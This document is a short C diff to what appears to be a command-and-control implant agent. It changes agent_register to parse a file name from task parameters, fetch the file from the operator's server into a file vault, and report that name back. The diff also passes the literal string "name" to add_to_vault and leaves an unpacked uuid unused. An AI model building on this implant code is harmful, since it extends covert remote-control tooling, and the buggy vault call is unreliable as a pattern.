@@ -71,7 +71,11 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 }
 
 void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
-	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, task->parameters);
+	int offset = 0;
+	char *name = unpack_str(task->parameters, &offset);
+	char *uuid = unpack_str(task->parameters, &offset);
+
+	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, name);
 	
 	while (upload.finished == FALSE) {
 		BOOL result = perform_upload(state, &upload);
@@ -90,13 +94,13 @@ void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	#endif
 
 	if (upload.error == FALSE) {
-		add_to_vault(&state->file_vault, "(TODO)", upload.current_buffer, upload.buflen); // TODO provide some kind of identifier
+		add_to_vault(&state->file_vault, "name", upload.current_buffer, upload.buflen); 
 	}
 
 	BOOL result;
 	TaskPostReply reply = { 0 };
 	if (upload.error == FALSE) {
-		result = perform_post(state, task, &reply, "(TODO)", "success"); // TODO provide some kind of identifier
+		result = perform_post(state, task, &reply, name, "success"); 
 	} else {
 		result = perform_post(state, task, &reply, "upload failed", "error: upload failed");
 	}
